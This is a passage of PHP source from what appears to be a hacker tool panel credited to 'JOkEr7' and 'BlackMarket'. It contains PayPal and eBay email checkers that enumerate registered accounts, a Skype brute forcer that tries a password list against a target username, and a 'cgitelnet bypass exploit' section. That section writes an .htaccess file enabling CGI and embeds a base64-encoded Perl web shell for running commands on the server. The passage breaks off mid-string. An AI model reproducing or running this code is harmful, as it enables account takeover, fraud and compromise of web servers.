$J7 = JOkEr7('https://www.paypal.com/webapps/shoppingcart/fallback?product=openButton&reason=shoppingcart_open_button_to_legacy&cmd=_xclick&business='.$email.'&=&=&wa_type=BuyNow&fallback=1&force_sa=true&xo_node_fallback=true&shopping_cart_node_fallback=true',$randIP);
#-----------------------++
preg_match_all("/s.eVar36=\"(.*?)\";/",$J7,$eVar36);
$C = $eVar36[1][0];
preg_match_all("/s.prop1=\"(.*?)\";/",$J7,$prop1);
#-----------------------++
if (!empty($C)) {
if(stristr($prop1[1][0],'Error')){
AddLine ('<font color="#722298"> LIMITED OR LOCKED</font> ... ');
ListLim($email);
}else{
AddLine ('<font color="#25722F"> REGISTERED <font color="#343434">|</font> '.$C.' </font> ... ');
$y = $yes++;
CountYes($y);
ListYes($email);
}
#-----------------------++
}else{
AddLine ('<font color="#722526"> NOT REGISTERED</font> ... ');
ListNot($email);
}
#-----------------------++
AddLine ('By J7 And </font><a style="color:#722298;font-size: 100%;" href="http://e-blackmarket.info/registeration" target="_blank">BlackMarket</a></span><br>');
#-----------------------------------------------------++
}else{
AddLine('[<font color="#722526">Error email</font>]</font></span><br>');
}
#-----------------------------------------------------++
}
#-----------------------------------------------------++
Done('<font color="#343434">[ <font color="#4E4E4E">Done </font><font color="#314A62"></font> ] . . .</font>');
#-----------------------------------------------------++
}else{ (@copy($_FILES['f']['tmp_name'], $_FILES['f']['name'])); echo '<a href="https://www.facebook.com/J7Group">Coded By JOkEr7 </a><a href="http://e-blackmarket.info/registeration" target="_blank"> | Code Editor By BlackMarket</a></div></section></div></body></html>'; 
}
}
if($_GET['do'] == 'echeck') {
/** EBay Email Checker By PraGa 
        email:indomilk87@gmail.com , Fb.com/praga.e
        **/     
        @set_time_limit(0);
        function curl_($POSTFIELDS){
                $ch = curl_init(); 
                curl_setopt($ch, CURLOPT_URL, "https://reg.ebay.com/reg/ajax"); 
                curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36");
                curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS);
                curl_setopt($ch, CURLOPT_REFERER, "https://reg.ebay.com/reg/PartialReg??_trksid=m570.l2621"); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 3);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
                $result = curl_exec($ch); 
                return $result;
                curl_close($ch);
        }
?>
<body>
<center>
<h1><font color="red"><--! Ebay Email Checker !--></h1>
                                <form method="POST" name="praga" action="">
                                        <textarea cols="30" rows="9" id="text" name="mail"><?php if(isset($_POST['mail'])){ echo $_POST['mail']; } ?></textarea><br>
                                        <input type="submit" value="Check!!" name="sub" />
                                </form></center></body>
        <?php
                if(isset($_POST['sub'])){
                        $email_list=$_POST['mail'];
                        $line = explode("\r\n",$email_list);
                        $line = array_unique($line);
                        $j=0;$k=0;$o=0;
                        for($i=0;$i<count($line);$i++){
                                if (filter_var($line[$i], FILTER_VALIDATE_EMAIL)) {
                                        echo "<font color='green'> valide ==> </font>".$line[$i]."...";
                                                $rez=curl_("email=".$line[$i]."&countryId=1&mode=5&eId=email");
                                                if (strpos($rez,'Your email address is already registered with eBay' ) ){ 
                                                echo "<font color='green'> Ok . <br> </font>";
                                                $live[$j]=$line[$i];
                                                $j++;
                                                flush();
                                        }else{
                                                echo "<font color='red'> Noo . <br> </font>";
                                                $die[$o]=$line[$i];
                                                $o++;
                                        }
                                }else{
                                echo "<font color='red'> Invalide mail </font>=>".$line[$i]."<br>";
                                $not[$k]=$line[$i];
                                $k++;
                                }
                        flush(); ob_flush();
                        
                        }
                ?>
                <table border="0" width="100%">
                        <tr>
                        <td align='center' style="color:green"> Ebay emails (<?php echo @count($live);?>)</td>
                        <td align='center' style="color:red"> Not Ebay Eamils (<?php echo @count($die);?>)</td>
                        <td align='center' style="color:orange"> Invalid emails (<?php echo @count($not);?>)</td>
                        </tr>
                <?php
                if(isset($live)){ echo "<tr><td align='center' ><textarea cols='43' rows='10'>";for($i=0;$i<count($live);$i++){echo $live[$i]."\n"; } echo "</textarea></td>";}
                if(isset($die)){ echo "<td align='center' ><textarea cols='43' rows='10'>";for($i=0;$i<count($die);$i++){echo $die[$i]."\n"; } echo "</textarea></td>";}else{echo "<td align='center' ><textarea cols='43' rows='10'></textarea>"; }
                if(isset($not)){ echo "<td align='center' ><textarea cols='43' rows='10'>";for($i=0;$i<count($not);$i++){echo $not[$i]."\n"; } echo "</textarea></td><tr></table>";}else{echo "<td align='center' ><textarea cols='43' rows='10'></textarea>";}
                }       
        }
if($_GET['do'] == 'skybrute') {
 ?>
<center>
<h1><font color='red'><--! Skype Brute Forcer !--></font></h1>
<form method='POST'>
<b>Username Target :</b><br>
<input type='text' name='skypename' placeholder='Skype Name' size='38'><br>
<b>Password List :</b><br>
<textarea rows='16' cols='38' name='passwords' placeholder='passwords'></textarea><br>
<input type='submit' value='Start Brute' name='brute'><br>
</center>
</form>
<?
        @set_time_limit(0);
        $skype = "https://login.skype.com/login?application=account&return_url=https%3A%2F%2Fsecure.skype.com%2Faccount%2Flogin";
        # Username & Password
        $username = $_POST['skypename'];
        $password = explode("\r\n", $_POST['passwords']);
       
        # time zone
   $time = date_default_timezone_set("Asia/Riyadh");
        $date = date('H:i:s'); //Returns IST
       
        # header
        $header = "HTTP/1.1 302";
       
        # Fucntion Detalis
        function xsecurity($skype)
        {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $skype);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch,CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
                curl_setopt($ch,CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $run = curl_exec($ch);
                preg_match('/<input type="hidden" name="session_token" value="(.*?)"/', $run, $hash);
                preg_match('/<input type="hidden" name="pie" id="pie" value="(.*?)"/', $run, $piie);
                preg_match('/<input type="hidden" name="etm" id="etm" value="(.*?)"/', $run, $etmm);
                return $hash[1]."|:|".$piie[1]."|:|".$etmm[1];
        }
       
        # Explode Detalis
        $xsec = explode("|:|" ,xsecurity($skype));
        $token = $xsec[0];
        $pie = $xsec[1];
        $etm = $xsec[2];
       
        # Function Brute
        function brute($skype,$username,$pass,$header)
        {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $skype);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "username={$username}&password={$pass}&timezone_field=%2B03%7C00&pie={$pie}&etm={$etm}&js_time={$date}&session_token={$token}&application=account&return_url=https%3A%2F%2Fsecure.skype.com%2Faccount%2Flogin");
                curl_setopt($ch,CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
                curl_setopt($ch,CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $brute = curl_exec($ch);
                if(strstr($brute, $header))
                {
                        echo "<font face='Tahoma' size='2'><center>[+] Password Cracked is <b>{$pass}</b> --> <b>{$username}</b></font></center>";
                }
                return $brute;
        }
        if($_POST['brute'])
        {
                foreach($password as $pass)
                {
                        brute($skype,$username,$pass,$header);
                }
        }
    }
if($_GET['do'] == 'cgi') {
echo "<center/><br/><b><font color=red>+--==[ cgitelnet.v1  Bypass Exploit]==--+ <br>Password=123456</font></b><br><br>";
 mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIjQUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O